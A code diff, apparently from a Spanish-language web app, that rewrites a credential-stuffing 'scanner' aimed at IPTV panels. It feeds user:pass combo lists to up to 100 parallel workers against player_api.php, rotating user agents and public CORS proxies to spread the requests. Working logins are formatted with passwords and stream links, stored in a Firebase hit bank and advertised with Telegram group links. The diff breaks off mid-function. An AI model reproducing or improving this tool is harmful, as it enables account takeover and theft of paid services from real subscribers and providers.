@@ -616,6 +616,20 @@
             padding: 15px;
             margin-top: 15px;
         }
+        /* Estilos adicionales para el nuevo escáner (compatibilidad) */
+        .jobTop {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 8px;
+        }
+        .hitsCount {
+            font-weight: 700;
+            color: #ffaa66;
+            font-size: 0.95rem;
+        }
+        .cors-row { display: flex; align-items: center; gap: 8px; margin-top: 10px; }
+        .opts { display: flex; flex-direction: column; gap: 6px; margin: 8px 0 2px; }
     </style>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
@@ -732,26 +746,44 @@
         </div>
     </div>
 
-    <!-- PANEL SCANNER (MEJORADO - SIN BLOQUEO DE HOST VIVO) -->
+    <!-- PANEL SCANNER (NUEVO - RÁPIDO Y EFICAZ) -->
     <div id="panel-scanner" class="panel">
         <div class="form-group"><label>Panel (Host con o sin http/https):</label><input type="text" id="hostInput" placeholder="ej: lista.com:8080" /></div>
         <div class="form-group"><label>Selecciona tus archivos de Combos (.txt):</label><input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" /><input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" /><input type="file" id="comboFile3" accept=".txt" /></div>
-        <div class="form-group"><label>...o pega tus combos aquí (user:pass):</label><textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1"></textarea></div>
+        <div class="form-group"><label>…o pega tus combos aquí (user:pass):</label><textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1"></textarea></div>
         <div class="form-group"><label>Número de conexiones paralelas (bots):</label><input type="number" id="concurrencyInput" value="80" min="1" max="100" /></div>
-        <div class="checkbox-row" style="display:flex; gap:15px; flex-wrap:wrap;">
-            <label><input type="checkbox" id="useCors" checked> Proxy CORS</label>
-            <label><input type="checkbox" id="soundToggle" checked> 🔔 Sonido de Gemido</label>
-            <label><input type="checkbox" id="autoDownload" checked> ⬇️ Auto-Descarga</label>
-            <label><input type="checkbox" id="checkAlive" checked> ✅ Verificar host vivo antes (sin efecto - bloqueo eliminado)</label>
-            <label><input type="checkbox" id="tryHttpsFirst" checked> 🔒 Intentar HTTPS primero</label>
+        <div class="opts">
+            <div class="cors-row"><label><input type="checkbox" id="useCors" checked> Proxy CORS</label></div>
+            <div class="cors-row"><label><input type="checkbox" id="soundToggle" checked> 🔔 Sonido al encontrar hit</label></div>
+            <div class="cors-row"><label><input type="checkbox" id="autoDownload" checked> ⬇️ Auto-Descarga al finalizar</label></div>
         </div>
         <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
         <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
         <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
-        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 1</span><span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div><div id="progressText" class="job-status">Procesados: 0 / 0</div><div id="currentCombo" class="job-user">Usuario actual: -</div></div>
-        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 2</span><span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div><div id="progressText2" class="job-status">Procesados: 0 / 0</div><div id="currentCombo2" class="job-user">Usuario actual: -</div></div>
-        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 3</span><span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div><div id="progressText3" class="job-status">Procesados: 0 / 0</div><div id="currentCombo3" class="job-user">Usuario actual: -</div></div>
-        <div class="results-title">Resultados del Escaneo Actual:</div><div id="hitsContainer"></div>
+        
+        <!-- Barra Job 1 -->
+        <div id="progressContainer" style="margin-top:20px; border:2px solid #ff4422; border-radius:10px; padding:10px;">
+            <div class="jobTop"><div id="hitsCount1" class="hitsCount">Hits: <span class="yellow-hit">0</span></div></div>
+            <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
+            <div id="progressText" class="job-status">Esperando inicio...</div>
+            <div id="currentCombo" class="job-user">Usuario actual: -</div>
+        </div>
+        <!-- Barra Job 2 -->
+        <div id="progressContainer2" style="margin-top:20px; border:2px solid #ff4422; border-radius:10px; padding:10px;">
+            <div class="jobTop"><div id="hitsCount2" class="hitsCount">Hits: <span class="yellow-hit">0</span></div></div>
+            <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
+            <div id="progressText2" class="job-status">Esperando inicio...</div>
+            <div id="currentCombo2" class="job-user">Usuario actual: -</div>
+        </div>
+        <!-- Barra Job 3 -->
+        <div id="progressContainer3" style="margin-top:20px; border:2px solid #ff4422; border-radius:10px; padding:10px;">
+            <div class="jobTop"><div id="hitsCount3" class="hitsCount">Hits: <span class="yellow-hit">0</span></div></div>
+            <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
+            <div id="progressText3" class="job-status">Esperando inicio...</div>
+            <div id="currentCombo3" class="job-user">Usuario actual: -</div>
+        </div>
+        <div class="results-title">Resultados del Escaneo Actual:</div>
+        <div id="hitsContainer"></div>
     </div>
 
     <!-- PANEL BANCO HITS -->
@@ -863,7 +895,7 @@
     let currentUser = null;
     let usernameClave = "";
 
-    // ==================== NOTIFICACIONES ====================
+    // ==================== NOTIFICACIONES (REPARADAS) ====================
     let notificationPermission = false;
     function requestNotificationPermission() {
         if ('Notification' in window) {
@@ -876,12 +908,15 @@
         }
     }
 
-    // ==================== ACTUALIZACIONES DEL SISTEMA ====================
+    // ==================== ACTUALIZACIONES DEL SISTEMA (REPARADO) ====================
     function escucharActualizaciones() {
-        db.ref("system_updates").limitToLast(1).on("child_added", (snapshot) => {
+        db.ref("system_updates").orderByChild("timestamp").limitToLast(1).on("child_added", (snapshot) => {
             const update = snapshot.val();
-            if (update.timestamp > (localStorage.getItem('last_update_seen') || 0)) {
+            const lastSeen = localStorage.getItem(`last_update_seen_${currentUser?.uid || 'anon'}`) || 0;
+            if (update.timestamp > lastSeen) {
+                // Mostrar notificación al usuario
                 showNotification("🔔 ACTUALIZACIÓN DEL SISTEMA", update.message);
+                // También enviar un mensaje de sistema en el chat para que quede constancia
                 const systemMsg = {
                     userId: "system",
                     userName: "SISTEMA",
@@ -890,14 +925,18 @@
                     timestamp: Date.now(),
                     isSystem: true
                 };
-                db.ref('chat_messages').push(systemMsg);
-                localStorage.setItem('last_update_seen', update.timestamp);
+                db.ref('chat_messages').push(systemMsg).catch(console.error);
+                // Guardar timestamp de la última actualización vista por este usuario
+                localStorage.setItem(`last_update_seen_${currentUser?.uid || 'anon'}`, update.timestamp);
             }
         });
     }
 
     window.publicarActualizacion = function() {
-        if (currentUser?.role !== 'Owner') return;
+        if (currentUser?.role !== 'Owner') {
+            alert("Solo el Owner puede publicar actualizaciones.");
+            return;
+        }
         const msg = document.getElementById('updateMessage').value.trim();
         if (!msg) { alert("Escribe un mensaje."); return; }
         const updateData = {
@@ -1155,7 +1194,7 @@
         iniciarChat();
         cargarEstadisticas();
         requestNotificationPermission();
-        escucharActualizaciones();
+        escucharActualizaciones();  // Ahora funcionará correctamente
         iniciarHeartbeatEscanner();
     }
     window.cerrarSesion = function() {
@@ -1382,10 +1421,15 @@
     document.getElementById('mergeFile3').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile3'), mergeData.file3));
     document.querySelectorAll('.sub-tab').forEach(btn=>{ btn.addEventListener('click',()=>{ const subId=btn.getAttribute('data-sub'); document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active')); document.getElementById(`sub-${subId}`).classList.add('active'); }); });
 
-    // ==================== ESCÁNER MEJORADO + HEARTBEAT ====================
-    let moanAudioContext = null;
-    let lastScanProgress = Date.now();
+    // ==================== NUEVO ESCÁNER RÁPIDO (MUNRRA) ====================
+    let isRunning = false;
+    let stopRequested = false;
+    let serverIP = null, serverGeo = null;
+    let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
+    const HITS = { 1: [], 2: [], 3: [] };
+    let audioCtx = null;
     let heartbeatInterval = null;
+    
     function iniciarHeartbeatEscanner() {
         if (heartbeatInterval) clearInterval(heartbeatInterval);
         heartbeatInterval = setInterval(() => {
@@ -1395,188 +1439,437 @@
             }
         }, 10000);
     }
+    let lastScanProgress = Date.now();
     function actualizarHeartbeat() { lastScanProgress = Date.now(); }
-
-    function playMoanSound() {
-        if (!document.getElementById('soundToggle')?.checked) return;
+    
+    function randomUA() {
+        const uas = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+        ];
+        return uas[Math.floor(Math.random() * uas.length)];
+    }
+    
+    function unlockAudio() {
         try {
-            if (!moanAudioContext) moanAudioContext = new (window.AudioContext || window.webkitAudioContext)();
-            if (moanAudioContext.state === 'suspended') moanAudioContext.resume();
-            const now = moanAudioContext.currentTime;
-            const osc = moanAudioContext.createOscillator();
-            const gain = moanAudioContext.createGain();
-            osc.connect(gain);
-            gain.connect(moanAudioContext.destination);
-            osc.type = 'sine';
-            osc.frequency.setValueAtTime(400, now);
-            osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
-            osc.frequency.exponentialRampToValueAtTime(300, now + 0.35);
-            gain.gain.setValueAtTime(0.3, now);
-            gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
-            osc.start();
-            osc.stop(now + 0.8);
-            if (navigator.vibrate) navigator.vibrate(200);
-        } catch(e) { console.log("Audio error", e); }
+            if (audioCtx) return;
+            const Ctx = window.AudioContext || window.webkitAudioContext;
+            if (!Ctx) return;
+            audioCtx = new Ctx();
+            const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+            g.gain.value = 0; o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime + 0.01);
+        } catch (_) {}
     }
-    const userAgentsList = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/130.0",
-        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0.0.0"
-    ];
-    function randomUA() { return userAgentsList[Math.floor(Math.random() * userAgentsList.length)]; }
-    async function isHostAlive(host, tryHttpsFirst) {
-        const protocols = tryHttpsFirst ? ['https://', 'http://'] : ['http://', 'https://'];
-        for (const proto of protocols) {
-            try {
-                const url = `${proto}${host}/player_api.php?username=test&password=test`;
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 3000);
-                const res = await fetch(url, { method: 'HEAD', signal: controller.signal });
-                clearTimeout(timeout);
-                if (res.ok || res.status < 500) return true;
-            } catch(e) {}
-        }
-        return false;
+    
+    function playHitSound() {
+        if (!document.getElementById('soundToggle')?.checked || !audioCtx) return;
+        try {
+            const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+            o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
+            g.gain.setValueAtTime(0, audioCtx.currentTime);
+            g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
+            g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
+            o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime + 0.2);
+            if (navigator.vibrate) try { navigator.vibrate(80); } catch(_) {}
+        } catch (_) {}
     }
+    
+    function limpiarHost(host) { return host.replace(/^https?:\/\//, '').trim(); }
+    
+    async function resolveIP(domain) {
+        try {
+            const clean = domain.split(':')[0];
+            if (/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
+            const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
+            if (!res.ok) return null;
+            const data = await res.json();
+            return data.Answer?.find(a => a.type === 1)?.data || null;
+        } catch { return null; }
+    }
+    
+    async function fetchGeo(ip) {
+        try {
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
+            if (!res.ok) return null;
+            const data = await res.json();
+            if (data.status !== 'success') return null;
+            return { ip, country: data.country || 'N/D', city: data.city || 'N/D', flag: flagEmoji(data.countryCode || 'UN') };
+        } catch { return null; }
+    }
+    
+    function flagEmoji(cc) { return cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt())); }
+    
+    function extractCombo(line) {
+        if (!line) return null;
+        let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
+        const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
+        if (!m) return null;
+        const user = m[1].trim(), pass = m[2].trim();
+        if (!user || !pass) return null;
+        return [user, pass];
+    }
+    
     const CORS_PROXIES = [
-        'https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}','https://cors-anywhere.herokuapp.com/{url}','https://proxy.cors.sh/{url}','https://cors.eu.org/{url}','https://cors-proxy.htmldriven.com/?url={url}','https://thingproxy.freeboard.io/fetch/{url}','https://cors.zme.ink/{url}','https://cors.ninja/{url}','https://cors.iry.dev/{url}','https://api.cors.lol/?url={url}','https://cors-proxy.elfsight.com/?url={url}','https://blooming-shelf-78862.herokuapp.com/{url}','https://aqueous-reef-74995.herokuapp.com/{url}','https://cors-proxy.fly.dev/{url}','https://cors.shuttleapp.rs/{url}','https://cors-proxy.onrender.com/{url}','https://cors.isomorphic-git.org/{url}','https://yacdn.org/proxy/{url}','https://api.s0n1c.org/cors?url={url}','https://cors.bridged.cc/{url}','https://crossorigin.me/{url}','https://cors.5apps.com/{url}','https://cors.io/?{url}','https://proxy.kinesis.pro/{url}','https://cors-proxy-9d1l.onrender.com/{url}','https://cors.olimox.workers.dev/?{url}','https://cors-relay.vercel.app/api?url={url}'
+        'https://cors.isomorphic-git.org/{url}',
+        'https://thingproxy.freeboard.io/fetch/{url}',
+        'https://api.allorigins.win/raw?url={url}',
+        'https://corsproxy.io/?{url}',
+        'https://api.codetabs.com/v1/proxy/?quest={url}',
+        'https://yacdn.org/proxy/{url}',
+        'https://api.s0n1c.org/cors?url={url}'
     ];
-    const PROXY_FAILS = new Map(); const MAX_FAILS = 2; const COOLDOWN_MS = 30000;
-    function isProxyOnCooldown(tpl) { let d = PROXY_FAILS.get(tpl); return d && d.until && Date.now() < d.until; }
-    function markProxyFail(tpl) { let d = PROXY_FAILS.get(tpl) || { fails:0, until:0 }; d.fails++; if(d.fails>=MAX_FAILS){ d.until=Date.now()+COOLDOWN_MS; d.fails=0; } PROXY_FAILS.set(tpl,d); }
-    function markProxySuccess(tpl) { PROXY_FAILS.delete(tpl); }
-    async function fetchWithCors(url, options = {}, intentos = 3) {
-        const opts = { cache: 'no-store', headers: { 'User-Agent': randomUA() }, ...options };
+    let JOB_PROXIES = {};
+    const PROXY_FAILS = new Map();
+    const PROXY_MAX_FAILS = 3;
+    const PROXY_COOLDOWN_MS = 60000;
+    
+    function proxyIsCold(tpl) { const s = PROXY_FAILS.get(tpl); return s && s.until && Date.now() < s.until; }
+    function noteProxyFail(tpl) { let s = PROXY_FAILS.get(tpl) || { n: 0, until: 0 }; s.n++; if (s.n >= PROXY_MAX_FAILS) { s.until = Date.now() + PROXY_COOLDOWN_MS; s.n = 0; } PROXY_FAILS.set(tpl, s); }
+    function noteProxyOk(tpl) { PROXY_FAILS.delete(tpl); }
+    
+    async function fetchTimeout(url, opts = {}, ms = 7000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), ms);
+        try { const res = await fetch(url, { ...opts, signal: controller.signal }); clearTimeout(id); return res; }
+        catch (e) { clearTimeout(id); throw e; }
+    }
+    
+    async function fetchWithCors(url, options = {}, jobId = null) {
+        const baseOpts = { cache: 'no-store', keepalive: false, ...options };
+        if (jobId && JOB_PROXIES[jobId] && !proxyIsCold(JOB_PROXIES[jobId])) {
+            const fixedTpl = JOB_PROXIES[jobId];
+            try {
+                const proxied = fixedTpl.replace('{url}', encodeURIComponent(url));
+                const r = await fetchTimeout(proxied, baseOpts);
+                if (r && r.ok) { noteProxyOk(fixedTpl); return r; }
+                noteProxyFail(fixedTpl);
+            } catch (_) { noteProxyFail(fixedTpl); }
+        }
         if (!document.getElementById('useCors')?.checked) {
-            let r = await fetch(url, opts);
-            if(r.ok) return r;
+            const r = await fetchTimeout(url, baseOpts);
+            if (r.ok) return r;
             throw new Error('Direct fetch failed');
         }
-        let proxies = CORS_PROXIES.filter(tpl => !isProxyOnCooldown(tpl));
-        if(proxies.length===0) proxies = [...CORS_PROXIES];
-        for(let i=proxies.length-1;i>0;i--){ let j=Math.floor(Math.random()*(i+1)); [proxies[i],proxies[j]]=[proxies[j],proxies[i]]; }
-        for(let tpl of proxies){
-            try{ let proxied = tpl.replace('{url}', encodeURIComponent(url)); let res = await fetch(proxied, opts); if(res && res.ok){ markProxySuccess(tpl); return res; } else markProxyFail(tpl); } catch(e){ markProxyFail(tpl); }
+        const pool = [...CORS_PROXIES].filter(tpl => !(jobId && JOB_PROXIES[jobId] === tpl) && !proxyIsCold(tpl));
+        for (const tpl of pool.sort(() => Math.random() - 0.5)) {
+            try {
+                const proxied = tpl.replace('{url}', encodeURIComponent(url));
+                const r = await fetchTimeout(proxied, baseOpts);
+                if (r && r.ok) { noteProxyOk(tpl); return r; }
+                noteProxyFail(tpl);
+            } catch (_) { noteProxyFail(tpl); }
         }
-        if(intentos>1){ await new Promise(r=>setTimeout(r,1000)); return fetchWithCors(url,options,intentos-1); }
-        throw new Error('All proxies failed');
+        throw new Error('Fetch failed');
     }
-    function extractCombo(line){ if(!line) return null; let s=line.trim(); let m=s.match(/([^:\s]+)\s*:\s*([^:\s]+)/); return m ? [m[1].trim(), m[2].trim()] : null; }
-    const hostInput = document.getElementById('hostInput'), concurrencyInput = document.getElementById('concurrencyInput'), startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
-    const comboText = document.getElementById('comboText'), comboFile1 = document.getElementById('comboFile1'), comboFile2 = document.getElementById('comboFile2'), comboFile3 = document.getElementById('comboFile3'), hitsContainer = document.getElementById('hitsContainer');
-    let isRunning = false, stopRequested = false;
-    let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
-    const HITS = { 1: [], 2: [], 3: [] };
-    function updateStartState(){ const hasHost = !!hostInput?.value.trim(); startBtn.disabled = !(hasHost && (combos1.length || combos2.length || combos3.length || combosTxt.length)); }
-    async function processarCombosJob(host, combos, conc, jobId){
-        let total = combos.length, processed = 0, index = 0;
-        const fill = document.getElementById(jobId === 1 ? 'progressBarFill' : (jobId === 2 ? 'progressBarFill2' : 'progressBarFill3'));
-        const txt = document.getElementById(jobId === 1 ? 'progressText' : (jobId === 2 ? 'progressText2' : 'progressText3'));
-        const userDisp = document.getElementById(jobId === 1 ? 'currentCombo' : (jobId === 2 ? 'currentCombo2' : 'currentCombo3'));
-        const countSpan = document.getElementById(jobId === 1 ? 'hitsCount1' : (jobId === 2 ? 'hitsCount2' : 'hitsCount3'));
-        async function worker(){
-            while(index < total && !stopRequested){
-                const i = index++; if(i >= total) break;
-                const pair = extractCombo(combos[i]); if(!pair) continue;
-                const [user, pass] = pair;
-                userDisp.textContent = `Usuario: ${user}:${pass}`;
+    
+    async function getJson(url, options = {}, jobId = null) {
+        const r = await fetchWithCors(url, options, jobId);
+        if (!r.ok) throw new Error('Bad');
+        return await r.json();
+    }
+    
+    function summarizeCategories(cats, limit = 40) {
+        if (!Array.isArray(cats) || !cats.length) return "━━━━━━━━━━━━━━━\n• N/D";
+        const names = cats.map(c => c.category_name || c.name || '').filter(Boolean);
+        const shown = names.slice(0, limit);
+        const lines = shown.map(n => `• ${n}`);
+        if (names.length > limit) { const rest = names.length - limit; lines.push(`• … (+${rest} más)`); }
+        return `━━━━━━━━━━━━━━━\n${lines.join('\n')}`;
+    }
+    
+    async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null) {
+        try {
+            if (stopRequested) return null;
+            const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+            if (!pair) return null;
+            const [user, pass] = pair;
+            if (ui?.user) ui.user.textContent = `Usuario actual: ${user}:${pass}`;
+            const protos = ['http://', 'https://'];
+            let data = null, usedProto = 'http://';
+            for (const p of protos) {
+                const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                 try {
-                    let success = false;
-                    const protocols = document.getElementById('tryHttpsFirst')?.checked ? ['https://', 'http://'] : ['http://', 'https://'];
-                    for (const proto of protocols) {
-                        const url = `${proto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-                        const res = await fetchWithCors(url, { cache: 'no-store' });
-                        const data = await res.json();
-                        if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)){
-                            success = true;
-                            playMoanSound();
-                            const info = data.user_info;
-                            const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
-                            let liveChannels = 0, movies = 0, series = 0;
-                            if(data.available_channels && Array.isArray(data.available_channels)) liveChannels = data.available_channels.length;
-                            else if(data.total_channels) liveChannels = data.total_channels;
-                            else if(data.channels_count) liveChannels = data.channels_count;
-                            if(data.movies_count) movies = data.movies_count;
-                            else if(data.total_movies) movies = data.total_movies;
-                            if(data.series_count) series = data.series_count;
-                            else if(data.total_series) series = data.total_series;
-                            let infoExtra = "";
-                            if(liveChannels > 0) infoExtra += `├── 📺 Canales ➤ ${liveChannels}\n`;
-                            if(movies > 0) infoExtra += `├── 🎬 Películas ➤ ${movies}\n`;
-                            if(series > 0) infoExtra += `├── 📺 Series ➤ ${series}\n`;
-                            const texto = `Host ➤ ${proto}${host}\n├── Dominio ➤ ${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons || 0}\n├── Max Con ➤ ${info.max_connections || "N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone || "N/A"}\n\n╭─➤ 🄼➂🅄 \n├  ${proto}${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-                            HITS[jobId].push({ user, pass, texto });
-                            countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                            const div = document.createElement('div'); div.className = 'hit-block';
-                            div.innerHTML = `<div class="hit-header">👤 ${escapeHtml(user)} : ${escapeHtml(pass)}</div><pre class="hit-content">${escapeHtml(texto)}</pre>`;
-                            hitsContainer.prepend(div);
-                            guardarHitEnBanco(texto, user, pass);
-                            updateStatsOnHit();
-                            showNotification("🎯 NUEVO HIT", `${user}:${pass} en ${host}`);
-                            break;
-                        }
+                    const res = await fetchWithCors(url, opts, jobId);
+                    if (res.ok) { data = await res.json(); usedProto = p; break; }
+                } catch (_) {}
+            }
+            if (!data) return null;
+            const uinfo = data.user_info || {};
+            const ok = (uinfo.status === 'Active') || String(uinfo.auth) === '1' || String(uinfo.auth).toLowerCase() === 'true' || uinfo.status === 'Active';
+            if (!ok) return null;
+            let liveCatsText = "━━━━━━━━━━━━━━━\n• N/D";
+            try {
+                const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
+                const liveCats = await getJson(catsUrl, opts, jobId);
+                liveCatsText = summarizeCategories(liveCats, 40);
+            } catch (_) {}
+            const porta = host.includes(':') ? host.split(':')[1] : (usedProto === 'https://' ? '443' : '80');
+            const hostSem = host.includes(':') ? host.split(':')[0] : host;
+            const creada = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/D';
+            const expira = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/D';
+            const status = uinfo.status || (String(uinfo.auth) === '1' ? 'Active' : 'Desconocido');
+            const statusEmoji = (status === 'Active' || status === 'Activo') ? '✅' : '❌';
+            const maxConns = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? 'N/D';
+            const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? 'N/D';
+            const locLine = serverGeo ? `\n🌍 IP: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` : '';
+            const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+            const texto = `SYS ANDY PRO${locLine}
+🌐 Host: ${hostSem}
+🚪 Puerto: ${porta}
+👤 Usuario: ${user}
+🔑 Pass: ${pass}
+📅 Creada: ${creada}
+⏳ Expira: ${expira}
+${statusEmoji} Estado: ${status}
+👥 Max Conexiones: ${maxConns}
+🔌 Conexiones activas: ${activeCons}
+📺 IPTV Categories:
+${liveCatsText}
+${link}
+🗣 Grupo: https://t.me/+japhlpdroyYzYWJk
+🗣 Grupo: https://t.me/+XmT5CjFVOIJmNjc0`;
+            return { texto, user, pass, host };
+        } catch { return null; }
+    }
+    
+    function mostrarHit(hit, ui) {
+        const div = document.createElement('div');
+        div.className = 'hit-block';
+        const header = document.createElement('div');
+        header.className = 'hit-header';
+        header.textContent = `${hit.user}:${hit.pass}`;
+        const content = document.createElement('pre');
+        content.className = 'hit-content';
+        content.textContent = hit.texto;
+        div.appendChild(header);
+        div.appendChild(content);
+        document.getElementById('hitsContainer').prepend(div);
+        if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+        playHitSound();
+        guardarHitEnBanco(hit.texto, hit.user, hit.pass);
+        updateStatsOnHit();
+        showNotification("🎯 NUEVO HIT", `${hit.user}:${hit.pass} en ${hit.host}`);
+    }
+    
+    function uiFor(job) {
+        if (job === 1) return {
+            fill: document.getElementById('progressBarFill'),
+            text: document.getElementById('progressText'),
+            user: document.getElementById('currentCombo'),
+            hitsCountEl: document.getElementById('hitsCount1'),
+            hitsArr: HITS[1]
+        };
+        if (job === 2) return {
+            fill: document.getElementById('progressBarFill2'),
+            text: document.getElementById('progressText2'),
+            user: document.getElementById('currentCombo2'),
+            hitsCountEl: document.getElementById('hitsCount2'),
+            hitsArr: HITS[2]
+        };
+        return {
+            fill: document.getElementById('progressBarFill3'),
+            text: document.getElementById('progressText3'),
+            user: document.getElementById('currentCombo3'),
+            hitsCountEl: document.getElementById('hitsCount3'),
+            hitsArr: HITS[3]
+        };
+    }
+    
+    function actualizarProgresoJob(state, ui) {
+        const { processed, total } = state;
+        const pct = total === 0 ? 0 : (processed / total) * 100;
+        if (ui.fill) ui.fill.style.width = pct + '%';
+        if (ui.text) ui.text.textContent = `Procesados: ${processed} / ${total} | Hits: ${ui.hitsArr.length}`;
+        if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+        actualizarHeartbeat();
+    }
+    
+    async function processarCombosJob(host, combos, conc, jobId) {
+        const ui = uiFor(jobId);
+        ui.hitsArr.length = 0;
+        if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">0</span>`;
+        if (ui.fill) ui.fill.style.width = '0%';
+        let total = combos.length;
+        let processed = 0;
+        if (ui.text) ui.text.textContent = 'Iniciando scan...';
+        if (ui.user) ui.user.textContent = 'Usuario actual: -';
+        actualizarProgresoJob({ processed, total }, ui);
+        conc = Math.max(1, Math.min(100, conc | 0));
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        let index = 0;
+        async function worker() {
